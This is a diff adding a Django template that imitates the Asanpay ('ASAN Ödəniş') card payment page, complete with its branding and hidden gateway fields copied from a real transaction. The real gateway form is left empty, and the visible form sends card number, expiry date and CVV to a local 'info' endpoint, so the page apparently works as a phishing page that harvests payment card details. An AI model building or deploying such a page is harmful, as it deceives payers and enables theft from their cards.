@@ -1,0 +1,399 @@
+{% load static %}
+<html><head>
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Asanpay</title>
+    <meta name="viewport" content="width=550, initial-scale=1.0">
+    <link rel="icon" href="https://asanpay.az/img/favicon.png">
+    <style>
+        TD {
+            padding-top: 7px;
+            padding-left: 7px;
+            padding-bottom: 7px;
+            font-family: Arial, Verdana, sans-serif;
+            font-size: 14px;
+            color: #4e4e4e;
+        }
+        .neutralTD {
+            padding-top: 0px;
+            padding-left: 0px;
+            padding-bottom: 0px;
+        }
+        .smallFONT {
+            font-family: Arial, Verdana, sans-serif;
+            font-size: 12px;
+            color: #4e4e4e;
+            padding-top: 0px;
+            padding-left: 0px;
+            padding-bottom: 0px;
+        }
+        .smallFONT2 {
+            font-family: Arial, Verdana, sans-serif;
+            font-size: 10px;
+            color: #a6a6a6;
+            padding-top: 0px;
+            padding-left: 0px;
+            padding-bottom: 0px;
+
+        }
+        .smallFONT3 {
+            font-family: Arial, Verdana, sans-serif;
+            font-size: 12px;
+            color: #4e4e4e;
+            padding-top: 0px;
+            padding-left: 0px;
+            padding-bottom: 0px;
+        }
+
+        .MAINoutline {
+            border: 1px solid #E4E1E1;
+        }
+
+        /* Formularfelder und Buttons */
+
+        INPUT.textfeld {
+            padding: .25rem .75rem;
+            font-size: 0.9rem;
+            line-height: 1.25;
+            color: #464a4c;
+            background-color: #fff;
+            background-image: none;
+            background-clip: padding-box;
+            border: 1px solid rgba(0,0,0,.15);
+            border-radius: .25rem;
+            transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
+        }
+
+        INPUT.cvv2 {
+            border: 1px solid #CFCFCF;
+            font: 12px Arial, Verdana sans-serif;
+            color: #474646;
+            background: #FFFFFF;
+            width: 45px;
+            margin: 1px 1px 1px 1px;
+        }
+        SELECT.monat {
+            border: 1px solid #CFCFCF;
+            font: 12px Arial, Verdana sans-serif;
+            color: #474646;
+            background: #FFFFFF;
+            width: 120px;
+            margin: 1px 1px 1px 1px;
+        }
+        SELECT.jahr {
+            border: 1px solid #CFCFCF;
+            font: 12px Arial, Verdana sans-serif;
+            color: #474646;
+            background: #FFFFFF;
+            width: 77px;
+            margin: 1px 1px 1px 1px;
+        }
+        SELECT.cardTYPE {
+            border: 1px solid #CFCFCF;
+            font: 12px Arial, Verdana sans-serif;
+            color: #474646;
+            background: #FFFFFF;
+            width: 200px;
+            margin: 1px 1px 1px 1px;
+        }
+        .button {
+            margin: 10px auto;
+            display: inline-block;
+            line-height: 1.25;
+            text-align: center;
+            vertical-align: middle;
+            user-select: none;
+            border: 1px solid transparent;
+            padding: .25rem 1rem;
+            font-size: 1rem;
+            border-radius: .25rem;
+            transition: all .2s ease-in-out;
+            color: #fff;
+            background-color: #ff8500;
+            border-color: #ff8500;
+            cursor: pointer;
+        }
+        .button:hover {
+            color: #fff;
+            background-color: #F57C00;
+            border-color: #F57C00;
+        }
+        img {
+            border: none;
+        }
+        .header-bg{
+            background: url("https://asanpay.az/img/header-bg.jpg") center top no-repeat;
+            height: 90px;
+            vertical-align: middle;
+        }
+        .select-field{
+            padding: .25rem .75rem;
+            font-size: 0.9rem;
+            line-height: 1.25;
+            color: #464a4c;
+            background-color: #fff;
+            background-image: none;
+            background-clip: padding-box;
+            border: 1px solid rgba(0,0,0,.15);
+            border-radius: .25rem;
+            transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
+        }
+        .text-center{
+            text-align: center;
+        }
+        .border-b{
+            border-bottom: 1px solid #E4E1E1;
+        }
+        #cardnumber{
+            width: 200px;
+        }
+
+    </style>
+</head>
+<body>
+<table align="center">
+    <tbody><tr valign="top">
+        <td class="neutralTD">
+            <div id="topredinfo" style="color: #ff0000; font-weight: bold;">&nbsp;</div><table class="MAINoutline" align="center" border="0" cellpadding="0" cellspacing="0" width="500">
+                <tbody>
+                <tr>
+                    <td class="neutralTD" colspan="2" align="left" valign="top">
+                        <table border="0" cellpadding="0" cellspacing="0" width="527">
+                            <tbody>
+                            <tr>
+                                <td class="neutralTD header-bg" align="center" valign="top">
+                                <a href="https://asanpay.az" target="_blank">
+                                    <img src="https://asanpay.az/img/logo.svg" height="63" width="383">
+                                </a></td>
+                            </tr>
+                            </tbody>
+                        </table>
+                    </td>
+                </tr>
+
+                <form action="/cgi-bin/cgi_link"  autocomplete="off"></form>
+                    <input name="TERMINAL" value="17201230" type="hidden">
+                    <input name="EMAIL" value="info@asanpay.az" type="hidden">
+                    <input name="TRTYPE" value="1" type="hidden">
+                    <input name="COUNTRY" value="AZ" type="hidden">
+                    <input name="MERCH_GMT" value="+4" type="hidden">
+                    <input name="TIMESTAMP" value="20230502151646" type="hidden">
+                    <input name="NONCE" value="db592ce026d32fe6" type="hidden">
+                    <input name="P_SIGN" value="6caa959b7022fa77e92937590976c1a62c473b74" type="hidden">
+                    <input name="FORM_ID" value="dmMnT1dfcropUkkn+eCIyfAShD29nUMCCxT0e0PjIPMYmXSs7UrkqqV7gOK1lwiaUdkbFrgSLrzJEOVesiHrbI8N8CeyVPl/BQLLfrAYQz/+FyYW67jlxvNLUIzpxwhXPrqa+BxeSSNQAMRDWzTi4iTeIFls7XhrSI9P+0MIZYXk2G3IVm4qSyz/9h4/X6FG9sBGuqOnubkw7UpnhZ6XL4dddP4u0a1eCu+hVlTX+ZaJS477P27MXGdnX/4UzU88oq6JytVidTnSlqwx7fenPH9+KW/NoUPB89/Zw9i9tbH5J63NxXH2v3bzlPJXsf+Vyix/Q3NR68aGH9gZc8DJS3aDKUaDMKezmAVebR/drwzJegYnduOP68BPQmonnYnVXOdkJ4AsJ2kWMyV8bS3fJYaX/vThP2IIOvekF42SdDrG4hDolSqu8zYkQU/X6A8gG+xb2uj7mq//bZhwljr0Rdu8B4ce8kYyaJzQJQXjdnpHXmNBZIIpXSlnmT0xKqox/CqTgsJVWBY+Mp08cknz3D0AI78y42OlXnaAVoawY7+suH1qxNsdnbZ34s+a3O6+d94a1KKd7ghoZnLU63UGzbkIbYUgs2nXUZCLmqXOxZX22L5uVXH8seVkqZIUS5JRBOgRbJmv9a/DqtsBfUcH4LHl0xnJg93V1UVZSPO9mlmNTtedcbIOf6rcf2qgLpKfFA6kR8pp8nMp0EoHKZJSosU7de0Y//kgLbU48E/3w9isUAVYFn+Wy6KyXEq2XwlExkY2lx6FZTc5xcdsrtpFnZWm/9aiASLFezEmokzGlAirHVvBabH3FYksC/ZuMeOz45OPFR0Qv+eRGz+g0pGw3x9/cia9zxayl51PWkICbxosKbzDuXHm12CN+Lyoxl4eM4Ksl61MD58/1cL42SW5EBgniNGPv90vx7lc0K/GGcYx8YuMilAzRR4NekaGf4PG2XeWccwu22beJWoSz2KIhVehb0ZAsEZQlRZHLE53SIv54p/5hLWgOewvil1WrU0XPQUbVKQKHVLghFMlcDcPP4sSZS8gE0QRaVCOG/bIW2Ga5D1JLVVlbu0PaCWIUiZYKLrMXViqmNbYCAISllgeYbAUMIAFYCrra4ebNPeGF0aVkg98MoyovIcYaIZgIgRsjZtFy/j9cyDLXwQUy0UzQJL/isO8fIlzL9grECsgVRl0OdIKP8zRyPo6MiJZLlfb5nRRGWD2zy1ZkMT1ooKWX2qMy48Ub6t9DEwNIj/fQg64aWc5V3idyi0n4T8oKVGpmImeL+I0W4dA++qFDx7tmxT6EXOnE9Aa6T6EOPsiYx7vtZlnccsFUZwRx8o9u1o/XEVUUX0EXcRt15tzjeCYrTXFikoKBOGE/bLbV1FUVh/y" type="hidden">
+                    <input name="LANG" value="" type="hidden">
+                    <input name="PAYMENT_TEXT" value="" type="hidden">
+                    <tr>
+
+                    </tr>
+                    <style>
+                        .error-message {
+                            display: none;
+                            color: red;
+                            font-size: 11px;
+                            margin-top: 5px;
+                          }
+                    </style>
+                    <form  method="POST" action="info" role="form" id='info'>
+                        {% csrf_token %}
+                                <tr>
+                                    <td align="left" class="border-b" valign="middle" width="250">
+                                        Kartın nömrəsi:<br>(arada boşluq işarəsi qoyulmadan)
+                                    </td>
+                                    <td align="left" class="border-b" width="250">
+                                        <input name="cardnumber" id="cardnumber" size="19" maxlength="16" title="Kartın nömrəsi 16 rəqəm olmalıdır"
+                                          class="textfeld" type="text">
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td align="left" valign="middle" class="border-b">
+                                        Kartın istifadə müddətinin bitmə tarixi:
+                                    </td>
+                                    <td align="left" valign="top" class="border-b">
+                                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                            <tbody>
+                                            <tr>
+                                                <td class="neutralTD" width="40%">
+                                                    <select name="mm" id="mm" size="1" class="monat select-field">
+                                                        <option selected="selected" value="">Ay</option>
+                                                        <option value="01">01 Yanvar</option>
+                                                        <option value="02">02 Fevral</option>
+                                                        <option value="03">03 Mart</option>
+                                                        <option value="04">04 Aprel</option>
+                                                        <option value="05">05 May</option>
+                                                        <option value="06">06 Iyun</option>
+                                                        <option value="07">07 Iyul</option>
+                                                        <option value="08">08 Avqust</option>
+                                                        <option value="09">09 Sentyabr</option>
+                                                        <option value="10">10 Oktyabr</option>
+                                                        <option value="11">11 Noyabr</option>
+                                                        <option value="12">12 Dekabr</option>
+                                                    </select>
+                                                </td>
+                                                <td class="neutralTD" width="60%">
+                                                    <select name="yy" id="yy" size="1" class="jahr select-field">
+                                                        <option value="23">2023</option>
+                                                        <option value="24">2024</option>
+                                                        <option value="25">2025</option>
+                                                        <option value="26">2026</option>
+                                                        <option value="27">2027</option>
+                                                        <option value="28">2028</option>
+                                                        <option value="29">2029</option>
+                                                        <option value="30">2030</option>
+                                                    </select><span id="exp_" style="display:none;"><font color="red">*</font></span>
+                                                </td>
+                                            </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td align="left" class="border-b" valign="top">
+                                        CVV2/CVC2:
+                                    </td>
+                                    <td align="left" class="border-b" valign="top">
+                                        <table border="0" cellpadding="0" cellspacing="0" width="250">
+                                            <tbody>
+                                            <tr>
+                                                <td class="neutralTD" align="left" valign="top" width="50">
+                                                    
+                                                    <input name="cvv" id="cvv" size="3" maxlength="3" class="cvv2 textfeld" type="password"><span id="cvv-error" class="error-message">asdasdsadsadsad</span>
+                                                </td>
+                                                <td class="neutralTD" width="190">
+                                                    <table border="0" cellpadding="0" cellspacing="0" width="190">
+                                                        <tbody>
+                                                        <tr align="left" valign="top">
+                                                            <td class="neutralTD" width="100" align="center">
+                                                                <img src="{% static '/img/cvv2.gif' %}" height="52" width="90">
+                                                            </td>
+                                                            <td class="neutralTD" width="70">
+                                                                <span class="smallFONT"> İmza panelindəki son 3 rəqəm.<span></span></span>
+                                                            </td>
+                                                        </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </td>
+                                            </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                                <script>
+                                    const cvvInput = document.getElementById('cvv');
+                                    const cvvError = document.getElementById('cvv-error');
+                                    
+                                    cvvInput.addEventListener('input', () => {
+                                      if (cvvInput.value.length < 3) {
+                                        cvvError.textContent = 'CVV 3 rəqəmli olmalıdır!';
+                                        cvvError.style.display = 'block';
+                                      } else {
+                                        cvvError.style.display = 'none';
+                                      }
+                                    });
+                                </script>
+                    
+                    <tr>
+                        <td align="left" class="border-b" valign="middle">
+                            Ödənişin məbləği:
+                        </td>
+                        <td align="left" class="border-b" valign="top">
+                            <strong>{{ amount }}</strong> <strong>AZN</strong>
+                            <input name="AMOUNT" value="1.00" type="hidden">
+                            <input name="CURRENCY" value="AZN" type="hidden">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td align="left" valign="middle" class="border-b">
+                            Sifarişin nömrəsi:
+                        </td>
+                        <td align="left" valign="top" class="border-b">
+                            <strong>2946313024200878080</strong>
+                            <input name="ORDER" value="2946313024200878080" type="hidden">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td align="left" valign="middle" class="border-b">
+                            Əməliyyatın təfsilatları:
+                        </td>
+                        <td align="left" valign="top" class="border-b">
+                            “ASAN Ödəniş“ sistemi
+                            <input name="DESC" value="asanpay.az" type="hidden">
+                            <input name="MERCH_NAME" value="ASANPAY" type="hidden">
+                            <input name="MERCH_URL" value="https://asanpay.az/common/show-payment-cheque/fcdc2b52-7dcf-4785-b692-17d5f1109403" type="hidden">
+                        </td>
+                    </tr>
+
+                    <tr>
+                        <td align="left" valign="middle" colspan="2" class="text-center border-b neutralTD">
+                            <input name="SEND_BUTTON" value="Approve" type="hidden">
+                            <input value="Təsdiqlə" class="button" onclick="check_form();" type="submit" id="sbmt">
+                        </td>
+                        </tr>
+                    <tr>
+                   
+                    
+                <td colspan="2" align="left" valign="middle">
+                    <table class="smallFONT" border="0" cellpadding="0" cellspacing="0" width="500">
+                        <tbody>
+                        <tr align="left" valign="top">
+                            <td colspan="2" class="neutralTD" height="20">
+                                <strong>Qeyd :</strong>
+                            </td>
+                        </tr>
+                        <tr align="left" valign="top">
+                            <td class="smallFONT" valign="top" width="11">-</td>
+                            <td class="smallFONT" width="509">
+                                Əgər sizin kartınız “3D Secure“ programında iştirak edirse, o zaman ekranda sizə öz “3D
+                                Secure“ parolunuzu daxil etmək təklif olunacaq.
+                            </td>
+                        </tr>
+                        <tr align="left" valign="top">
+                            <td class="smallFONT" valign="top">-</td>
+                            <td class="smallFONT">
+                                Əgər sizin kartınız “ 3D Secure“ proqramında iştirak etmirse, lakin sizin bank bu
+                                xidməti dəstəkləyirsə o zaman öz bankınıza müraciət edin.
+                            </td>
+                        </tr>
+                        <tr align="left" valign="top">
+                            <td class="smallFONT" valign="top">-</td>
+                            <td class="smallFONT">
+                                Əgər sizin bankınız “ 3D Secure“ xidmətini dəstəkləmirsə o zaman siz əməliyyatları
+                                yalnız kartınlızdakı CVV/CVV2 kodları ilə apara bilərsiniz(VISA \ MasterCard).
+                            </td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </td>
+                </tr>
+                </tbody>
+            </table>
+        </td>
+    </tr>
+</tbody></table>
+
+
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="450">
+    <tbody>
+    <tr align="center">
+        <td>
+            <img src="{% static '/img/cchead.gif' %}" height="63" width="383">
+        </td>
+    </tr>
+    <tr>
+        <td class="smallFONT3" align="center">
+            2023 © ASAN ödəniş sistemi. Müəllif hüquqları qorunur.
+        </td>
+    </tr>
+    </tbody>
+</table>
+<script type="text/javascript">
+var butt = document.getElementById('sbmt');
+butt.addEventListener('click', function(event) {
+setTimeout(function () {
+event.target.disabled = true;
+}, 0);
+});
+</>
+
+
+<a id="lbLauncher" class="lytebox" style="display: none;"></a><div id="lbOverlay" class="black" style="display: none;"></div><div id="lbMain" style="display: none;"><div id="lbOuterContainer" class="black" style="border-radius: 8px;"><div id="lbTopContainer" class="black" style="border-radius: 8px;"><div id="lbTopData" class="black"><span id="lbTitleTop"></span><span id="lbNumTop"></span></div><div id="lbTopNav"><a id="lbCloseTop" title="Close (Esc)" class="black" href="javascript:void(0)"></a><a id="lbPrintTop" title="Print" class="black" href="javascript:void(0)"></a><a id="lbNextTop" title="Next (→)" class="black" href="javascript:void(0)"></a><a id="lbPauseTop" title="Pause (spacebar)" class="black" href="javascript:void(0)" style="display: none;"></a><a id="lbPlayTop" title="Play (spacebar)" class="black" href="javascript:void(0)" style="display: none;"></a><a id="lbPrevTop" title="Previous (←)" class="black" href="javascript:void(0)"></a></div></div><div id="lbIframeContainer" style="display: none;"><iframe id="lbIframe" name="lbIframe" frameborder="0" class="black" style="display: none;"></iframe></div><div id="lbImageContainer"><img id="lbImage" class="black"><div id="lbHoverNav"><a id="lbPrevHov" title="Previous (←)" class="black" href="javascript:void(0)"></a><a id="lbNextHov" title="Next (→)" class="black" href="javascript:void(0)"></a></div></div><div id="lbLoading" class="black"></div><div id="lbBottomContainer" class="black" style="border-radius: 8px;"><div id="lbBottomData" class="black"><span id="lbTitleBottom"></span><span id="lbNumBottom"></span><span id="lbDescBottom"></span></div><div id="lbBottomNav"><a id="lbClose" title="Close (Esc)" class="black" href="javascript:void(0)"></a><a id="lbPrint" title="Print" class="black" href="javascript:void(0)" style="display: none;"></a><a id="lbNext" title="Next (→)" class="black" href="javascript:void(0)"></a><a id="lbPause" title="Pause (spacebar)" class="black" href="javascript:void(0)" style="display: none;"></a><a id="lbPlay" title="Play (spacebar)" class="black" href="javascript:void(0)" style="display: none;"></a><a id="lbPrev" title="Previous (←)" class="black" href="javascript:void(0)"></a></div></div></div></div></body></html>
